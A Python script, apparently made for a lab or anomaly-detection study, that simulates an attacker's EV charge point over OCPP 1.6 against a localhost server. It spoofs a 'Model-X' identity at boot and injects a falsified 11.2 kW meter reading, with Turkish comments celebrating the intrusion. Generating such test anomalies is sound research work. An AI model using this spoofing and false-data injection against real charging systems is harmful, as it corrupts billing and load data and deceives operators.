import asyncio
import logging
from websockets import connect
from ocpp.v16 import ChargePoint as cp
from ocpp.v16 import call

# Logları görelim
logging.basicConfig(level=logging.INFO)

class SaldirganIstasyon(cp):
    async def boot_ol(self):
        # Merkeze normal bir istasyonmuş gibi bağlanıyoruz
        # Saldırgan kendini "Model-X" olarak tanıtıyor (Taklit/Spoofing)
        request = call.BootNotification(
            charge_point_model="Model-X",
            charge_point_vendor="Tesla-Similator"
        )
        response = await self.call(request)
        if response.status == 'Accepted':
            print("\n[SALDIRGAN] 😈 Sisteme sızıldı. Merkez bizi normal istasyon sanıyor.")

    async def sahte_veri_gonder(self, guc_degeri):
        # BURASI ANOMALİNİN KALBİ
        # Normalde 3.6 olması gereken veriyi manipüle ederek gönderiyoruz.
        print(f"[SALDIRGAN] ⚡ Manipüle edilmiş veri hazırlanıyor: {guc_degeri} kW")
        
        request = call.MeterValues(
            connector_id=1,
            meter_value=[{
                "timestamp": "2023-12-14T10:05:00Z",
                "sampled_value": [{"value": str(guc_degeri), "unit": "kW"}]
            }]
        )
        await self.call(request)
        print(f"[SALDIRGAN] 🚀 SAHTE VERİ MERKEZE ENJEKTE EDİLDİ: {guc_degeri} kW")

async def main():
    # Merkeze bağlan (Aynı porttan sızıyoruz)
    async with connect(
        'ws://localhost:9000/CP_SALDIRGAN',
        subprotocols=['ocpp1.6']
    ) as ws:
        hacker = SaldirganIstasyon('CP_SALDIRGAN', ws)
        await asyncio.gather(hacker.start(), saldiri_senaryosu(hacker))

async def saldiri_senaryosu(hacker):
    # 1. Sisteme giriş yap (Güven kazan)
    await hacker.boot_ol()
    await asyncio.sleep(1)

    # 2. SALDIRI BAŞLIYOR: MANİPÜLE EDİLMİŞ YÜK (11.2 kW)
    # Senin dokümanındaki manipüle değer 
    print("\n--- ANOMALİ BAŞLATILIYOR ---")
    await hacker.sahte_veri_gonder(11.2)
    
    print("\n[SALDIRGAN] Görev tamamlandı. İz kaybettiriliyor...")
    await asyncio.sleep(5)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Saldırı durduruldu.")